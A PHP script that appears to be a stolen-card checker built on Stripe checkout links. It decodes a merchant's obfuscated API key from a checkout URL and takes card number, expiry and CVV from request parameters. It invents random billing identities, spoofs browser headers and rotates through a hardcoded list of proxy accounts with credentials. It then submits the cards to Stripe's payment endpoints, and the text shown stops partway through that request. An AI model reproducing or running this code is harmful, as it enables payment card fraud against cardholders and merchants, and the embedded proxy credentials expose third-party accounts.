<?php
include 'config.php';
if (!isset($_GET['referrer']) || $_GET['referrer'] != "Auth") {
    $i = rand(0,sizeof($red_link)-1);
    header("location: $red_link[$i]");
    exit();
}
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

// Random information API
//$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
//$a = json_decode($resp);
//$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
//$name = $a->hello->person->first_name ?? "Alice";
//$lname  = $a->hello->person->last_name ?? "Schuberg";
//$phone      = $a->hello->person->phone;
//$ua         = $a->hello->person->ua;
//$street     = $a->hello->street->name ?? "314 alden ave";
//$city       = $a->hello->street->city ?? "rohnert park";
//$zip        = $a->hello->street->zip ?? "94928";
//$state      = $a->hello->street->state ?? "CA";
//$state_full = $a->hello->street->state_full ?? "California";
//$regionId   = $a->hello->street->regionId ?? "12";
//$country    = $a->hello->street->country ?? "United States";
//$fivenums   = rand(1000, 9999); // Generate 5 random numbers

$first_names = array(
    "Alice", "Bob", "Charlie", "David", "Emily", "Frank", "Grace", "Henry", "Isabella", "James", "Kate", "Liam", "Mia", "Nathan", "Olivia", "Peter", "Quentin", "Rachel", "Sophia", "Thomas", "Ursula", "Victoria", "William", "Xavier", "Yvette", "Zachary"
);
$last_names = array(
    "Anderson", "Brown", "Clark", "Davis", "Edwards", "Ford", "Garcia", "Harris", "Irwin", "Jones", "Keller", "Lewis", "Martinez", "Nelson", "O'Brien", "Parker", "Quinn", "Rodriguez", "Smith", "Taylor", "Unger", "Valdez", "Williams", "Xu", "Young", "Zhang"
);
$complete_name = $first_names[array_rand($first_names)] . "+" . $last_names[array_rand($last_names)];

$cities = array(
    'Quezon+City',
    'Manila',
    'Caloocan',
    'Davao+City',
    'Cebu+City',
    'Zamboanga+City',
    'Taguig',
    'Pasig',
    'Antipolo',
    'Valenzuela',
    'Las+Piñas',
    'Makati',
    'Marikina',
    'Muntinlupa',
    'Navotas',
    'Parañaque',
    'Pasay',
    'San+Juan',
    'Mandaluyong',
    'Bacoor',
    'Cainta',
    'San+Mateo',
    'Imus',
    'Dasmariñas',
    'Silang',
    'General+Trias',
    'Trece+Martires',
    'Tagaytay',
    'Santa+Rosa',
    'Los+Banos',
    'San+Pedro',
    'Biñan',
    'Calamba',
    'Lipa',
    'Batangas+City',
    'Tanauan',
    'Santo+Tomas',
    'Laguna',
    'Iloilo+City',
    'Bacolod+City',
    'Cagayan+de+Oro',
    'General+Santos',
    'Iligan',
    'Butuan',
    'Ozamiz',
    'Tacloban',
    'Ormoc',
    'Catarman',
    'Naga',
    'Legazpi'
);
$random_city = $cities[array_rand($cities)];

$streets = array(
    "Makati+Avenue",
    "Ayala+Avenue",
    "Buendia+Avenue",
    "EDSA",
    "Pasay+Road",
    "Paseo+de+Roxas",
    "Gil+Puyat+Avenue",
    "Chino+Roces+Avenue",
    "Taft+Avenue",
    "Shaw+Boulevard",
    "Ortigas+Avenue",
    "Quezon+Avenue",
    "Commonwealth+Avenue",
    "Rodriguez+Avenue",
    "C5+Road",
    "Sampaguita+District",
    "Derederetso+lang",
    "Roxas+Boulevard",
    "Quirino+Avenue",
    "Araneta+Avenue"
);
$random_street = $streets[array_rand($streets)];

$checkoutlink = $_GET['colink'];
$colink = $checkoutlink;

$obfuscatedPK = urldecode(explode("#", $colink)[1]);
$deobfed = '';

$decoded = base64_decode($obfuscatedPK);

for ($i = 0; $i < strlen($decoded); $i++) {
    $deobfed .= chr(5 ^ ord($decoded[$i]));
}

$shuroap = json_decode($deobfed, 1);
$pk = $shuroap['apiKey'];
//echo "$pk<br>";
$sec = g($colink, '/pay/', '#');
//echo "$sec<br>";
$amt = $_GET['xamount'];
if (empty($_GET['xemail'])) {
    $email = 'phc_alice_random' . rand(000000, 999999) . '@gmail.com';
    $xemail = str_replace('@', '%40', $email);
} elseif (!empty($_GET['xemail'])) {
    $email = $_GET['xemail'];
    $xemail = str_replace('@', '%40', $email);
}

// rotating proxy by Alice if failed hosting server magiging ip
$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$builtin_proxies = isset($_GET['builtin_proxies']) ? $_GET['builtin_proxies'] : '';
if (!empty($_GET['builtin_proxies'])) {
$myproxies = array(
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!nl!hddv!yb8KMSxLsmr:1dskqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!gtOTRfhioI0:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yIiw5QHCokO:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yegwUgd8jn3:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!se!hddv!gN1aRljlpVM:adsk3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!y0rL7RWzmBH:ad7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pl!hddv!yN9z4hMn3ta:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!fr!hddv!ykB64Tf9wlm:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yzrjkLU95wc:1dsk3jfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yG8mbFDVuBT:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!ydWSk4casVv:ad7k3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!ySbCvoSGfU9:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!y8pkZBLbvLQ:1dsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!es!hddv!yqjkFrQvm3N:1d7k3jfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yzfnR5OOfEe:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!at!hddv!yhcXlTizfR3:1d7kqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!ySXm8wBqBEp:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!ynxpi2IokTK:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!de!hddv!yRhJpgjAUMD:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pl!hddv!gKhPb3kbPcT:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pl!hddv!g6gO071B8zh:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!cz!hddv!yqXNvIhcZJ8:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yzG045cUSnQ:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!gB9UflLLWtj:1dsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!cz!hddv!yOPL2vhqppW:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!y1vNaN4ByzA:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!gb!hddv!guDVLEj8rQ6:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!at!hddv!gXDoipV29kA:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!lu!hddv!gJMkM6X5AeT:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!hu!hddv!y9pNGuRoEuv:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!de!hddv!g00792O3nZR:1dsk3jfj3kiuf3f',
        'p6.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!ywmO7m2lpcA:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!at!hddv!yeDzf1pXdsy:1d7k3jfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yYFVtl9N7cz:1dsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!it!hddv!gZpWOeKRemq:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!gb!hddv!gbgklpVFTXW:ad7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!nl!hddv!ydVkcst8ZWL:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!gjmMz9MaLCP:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yacXx71jCpf:adsk3jfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!gnmIPPr157B:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!hu!hddv!gEV9VUcboRu:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!de!hddv!gS8AvT95n82:adskqjfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yGUss0W528C:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!cz!hddv!gA90oFzYJ8Q:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!gb!hddv!yYTZpQjVu38:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yj0tSbU5uvs:ad7kqjfj3kiuf3f',
        'p6.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!g6nqr4Hu6Uq:1dskqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!ymkcCnJ2Dyx:adsk3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yV8c25EjWjN:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!fr!hddv!gzIROiiW8w1:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yFFh22nMwyE:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!cz!hddv!gSrXFMo0jo6:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!at!hddv!ynOqPinqLr9:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!nl!hddv!gTSjZyUXs22:1d7k3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!y1G0HyEJTHK:ad7k3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yDANzLJetTL:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!gTTsJGjstdy:adskqjfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yFIiuWSLzEk:1d7kqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yhGUqXPAd0v:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!gS5lU8LDvck:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pl!hddv!ydDSEvHwnbT:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pt!hddv!gC1pZUcFmAv:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!y48gQbJ1Ugf:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!lu!hddv!yM8vlH0FvFE:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!lu!hddv!ybmGZn3Yw1Q:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!gb!hddv!ynow1VgT4bm:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!es!hddv!ynld2hSIHa5:1d7k3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!g2FSCc4nGu4:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!gb!hddv!gGZ34qaVFXv:ad7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!ym3kM84lm3p:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!at!hddv!gNGPOFOPYC1:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!nl!hddv!gXGYc1NPAEA:1d7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!hu!hddv!y2P1p7dfmer:1dsk3jfj3kiuf3f',
        'p3.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!gwz8VFOoyYC:ad7kqjfj3kiuf3f',
        'p6.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yi3eIl9fxB2:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pl!hddv!ynG9bhVF0Z9:ad7k3jfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yEhJUXf8UVv:1d7kqjfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yIlIsDpUCit:ad7kqjfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!g6oT4mhCTLq:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!es!hddv!gcbSqZfdfhs:ad7kqjfj3kiuf3f',
        'p6.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!guXRNiGLZJD:ad7kqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!gmaxHr7XSFq:1dskqjfj3kiuf3f',
        'p6.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!y9yZ9IoIyhj:1dskqjfj3kiuf3f',
        'p1.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!y12VbJ4beMX:1dskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!nl!hddv!gGpj6PU38AM:ad7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!de!hddv!gH6Dy0nKDsY:adskqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!ydPw8046qx2:adskqjfj3kiuf3f',
        'p2.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!us!hddv!yacCrXEgpZn:adsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!pt!hddv!yIduSt7JX7G:ad7kqjfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!gz27EybzMi0:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yfcHLlkpgZ4:ad7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yJpkdAu99Rx:1dsk3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:1As3q5461-mushroom-6b5d91540b!de!hddv!yJcoJWE0AvO:1d7k3jfj3kiuf3f',
        'p5.mushroomproxy.com:8000:a6793E182-mushroom-478f0acbce!cz!hddv!yEaAaoLNOiW:adsk3jfj3kiuf3f'
);
$rotateproxies = $myproxies[array_rand($myproxies)];
$ip_parts = explode(':', $rotateproxies);
$rotateips = "$ip_parts[0]:$ip_parts[1]";
$rotateaccounts = "$ip_parts[2]:$ip_parts[3]";

} elseif (empty($_GET['builtin_proxies'])) {
    $rotateips = '';
    $rotateaccounts = '';
}
$proxy = !empty($ip) ? $ip : ''.$rotateips.'';
$proxyauth = !empty($hydra) ? $hydra : ''.$rotateaccounts.'';

list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
$scc = implode('+', str_split($cc, 4));
$m = ltrim($mm, "0"); $mm === "10" ? $m = "10" : $mm;
strlen($yyyy) == 2 ? $yyyy = '20' . $yyyy : null; $yy = substr($yyyy, 2,2);
$card = "$cc|$mm|$yy|$cvv";
$type = $cc[0] == '4' ? 'Visa' : 'Mastercard'; 


function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function c($l){
    $x = '0123456789abcdefghijklmnopqrstuvwxyz';
    $y = strlen($x);
    $z = '';
  
  for ($i=0; $i<$l ; $i++) { 
   $z .= $x[rand(0, $y - 1)];
  }
    return $z;
  } 

$guid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$muid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sid = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);
$sessionID = c(8).'-'.c(4).'-'.c(4).'-'.c(4).'-'.c(12);

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$cookies = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($cookies, 'w+');
fclose($cookietempfile);

$mask = substr_replace($cc,'xxxxxxxxxx',0,10);
$extrap = $mask."|".$mm."|".$yy;
$extrap;
///////////////=============================////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $ip = curl_exec($ch);
 curl_close($ch);

$ips = g($ip,'"query":"','"');
$ip_countryflag = json_decode($ip, true)['countryCode'];
$ip_countryname = json_decode($ip, true)['country'];
if (!empty($ips)) {
    $myip = "<img src='https://flagcdn.com/16x12/".strtolower($ip_countryflag).".png' srcset='https://flagcdn.com/32x24/".strtolower($ip_countryflag).".png 2x, https://flagcdn.com/48x36/".strtolower($ip_countryflag).".png 3x' width='16' height='12' alt='$ip_countryname'> <font class='text-white'>$ips</font><br>";
} else {
$myip = "";
}

$retry = 0;
$max_retries = 4;
$response = '';
while ($retry < $max_retries && empty($response)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'/init');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
$curl = curl_exec($ch);
curl_close($ch);
$retry++;
}

 $curl;
 $amttt = g($curl,'"unit_amount_decimal": "','"');
 $xmail = g($curl,'"customer_email": "','"');
 $currency = g($curl,'"currency": "','"');
 $sessionstatus = json_decode($curl, true)['error']['message'];
 $paymentname1 = json_decode($curl, true)['account_settings']['display_name'];
 $paymentname2 = json_decode($curl, true)['account_settings']['display_name'];
 $cancelurl1 = json_decode($curl, true)['cancel_url'];
 $cancelurl2 = json_decode($curl, true)['cancel_url'];
 if (!empty($cancelurl1)) {
    $cancelurl1 = "🙅‍♂️ Return URL: [click here](".urldecode($cancelurl1).")\r\n";
 } else {
    $cancelurl1 = "";
 }
 if (!empty($cancelurl2)) {
    $cancelurl2 = "🙅‍♂️ Return URL: [".urldecode($cancelurl2)."](".urldecode($cancelurl2).")\r\n";
 } else {
    $cancelurl2 = "";
 }
 if (!empty($paymentname1)) {
    $paymentname1 = "🛒 Merchant: $paymentname1\r\n$cancelurl1";
} else {
    $paymentname1 = "";
}
 if (!empty($paymentname2)) {
    $paymentname2 = "🛒 Merchant: $paymentname2\r\n$cancelurl2";
} else {
    $paymentname2 = "";
}
if (empty($curl)) {
    echo "";
}

#########if the co link has tos
if (!empty($_GET['tos'])) {
$retry = 0;
$max_retries = 4;
$response = '';
while ($retry < $max_retries && empty($response)) {
$ch = curl_init();
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$sec.'');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POST, 1);
$postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pk.'';
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
//SET YOUR RANDOM HEADERS
$headers = array(
    'User-Agent: ' => array(
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Edge/16.16299',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' SE 2.X MetaSr 1.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' OPR/45.0.2552.635',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).' Vivaldi/1.9.818.44',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/'.rand(11,99).'.'.rand(11,99).'',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko',
  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/'.rand(11,99).'.'.rand(11,99).'; AS; rv:'.rand(11,99).'.'.rand(11,99).') like Gecko'
),
    // add more headers here
);

$randomHeaders = array();
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$response = curl_exec($ch);
curl_close($ch);
$retry++;
}

if (empty($response)) {
    echo "";
}
} else {
    echo "";
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
if($_GET['gate'] === '1') {
$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.rand(11,99).'+'.$random_street.'&billing_details[address][city]='.$random_city.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F30560cb275%3B+stripe-js-v3%2F30560cb275%3B+checkout';
} elseif($_GET['gate'] === '2') {
$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2Fb94a554920%3B+stripe-js-v3%2Fb94a554920%3B+checkout';
} elseif($_GET['gate'] === '3') {
$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.rand(11,99).'+'.$random_street.'&billing_details[address][city]=Cromwell&billing_details[address][postal_code]=55726&billing_details[address][state]=MN&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2Fb94a554920%3B+stripe-js-v3%2Fb94a554920%3B+checkout';
}
$headers = array();
$headers[] = 'method: POST';
$headers[] = 'path: /v1/payment_methods';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'referer: https://checkout.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-gpc: 1';
